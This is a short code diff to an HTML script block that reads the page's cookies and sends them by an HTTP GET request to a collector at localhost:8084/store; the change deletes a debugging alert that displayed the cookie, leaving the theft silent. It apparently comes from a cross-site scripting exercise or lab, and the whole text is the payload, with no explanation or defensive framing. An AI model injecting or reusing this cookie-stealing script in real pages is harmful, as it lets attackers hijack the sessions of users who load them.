@@ -1,4 +1,3 @@
-
 <script>
     var cookie = document.cookie;
 
@@ -6,6 +5,4 @@
     var url='http://localhost:8084/store?value='+cookie;
     Http.open("GET", url);
     Http.send();
-
-    alert("test" + cookie);
 </script>
